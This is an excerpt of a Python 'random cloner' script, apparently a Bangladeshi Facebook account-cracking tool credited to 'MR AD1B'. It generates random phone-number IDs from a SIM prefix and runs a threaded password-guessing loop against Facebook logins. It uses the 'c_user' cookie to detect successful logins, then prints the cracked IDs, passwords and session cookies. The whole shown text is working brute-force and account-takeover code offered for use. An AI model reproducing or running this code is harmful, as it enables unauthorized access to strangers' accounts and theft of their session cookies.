...
os.system('espeak -a 300 "hello sir welcome to AD1B random clone tools"')
...
\033[1;33m╿                 / _ \    | (_) |    
\033[1;32m╿                 / /_\ \ __| |_| |__  
\033[1;33m╿                 |  _  |/ _` | | '_ \                                                         \033[1;91m N  \033[1;33m╿
\033[1;32m╿                 | | | | (_| | | |_) |                                                          \033[1;91m O  \033[1;32m╿
\033[1;33m╿                 \_| |_/\__,_|_|_.__/                                               \033[1;91m O  \033[1;33m╿
\033[1;32m╿                                                   \033[1;91m B  \033[1;32m╿
\033[1;33m═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━━═━

\033[1;32m◆━━━━━━━━━━━━━━━━━━━━━━━━━━━▣✦▣━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆
\033[1;32m{+} TOOLS CREATOR         : \033[1;33mMR AD1B
\033[1;32m{+] FACEBOOK              : \033[1;33mAHMED ADIB
\033[1;33m{+} TOOLS                 : \033[1;32mRANDOM CLONER
...
def v2():
    ...
    os.system('xdg-open fb://group/1885398221816745?ref=share&mibextid=NSMWBT')
    print(logo)
    os.system('espeak -a 300 "Enter Your Sim Code Plz"')
    print('\x1b[1;96m[+] SIM CODE BD=> 016•017•018•019')
    kode = input('\033[1;32m[\033[1;32m?\033[1;32m] SIM CODE : ')
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    os.system('espeak -a 300 "ENTER YOUR CRACK LIMIT PLZ"')
    print('\x1b[1;95m[+] 2000•5000•10000•15000•50000')
    ...
    with ThreadPool(max_workers=100) as akash:
        os.system('clear')
        os.system('espeak -a 300 "This Tools Only Work Wifi And Grameenphone,Teletok,Airtel Sim Dont work Robi Sim So Careful Your Crack Has Been Started"')
        print(logo)
        tl = str(len(user))
        print('\033[1;32m─────────────────────────────────────')
        print('\033[1;37m[\033[1;32m✓\033[1;32m] \x1b[1;95mCODE     : '+kode)
        print('\033[1;37m[\033[1;32m✓\033[1;32m] \x1b[1;94mTOTAL ID : '+tl)
        print('\033[1;32m─────────────────────────────────────')
        for guru in user:
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;31m[%sAD1B_KING\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f"\033[38;5;46m[AD1B-OK💥] {uid} • {ps}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[AD1B-CP] {uid} • {ps}")
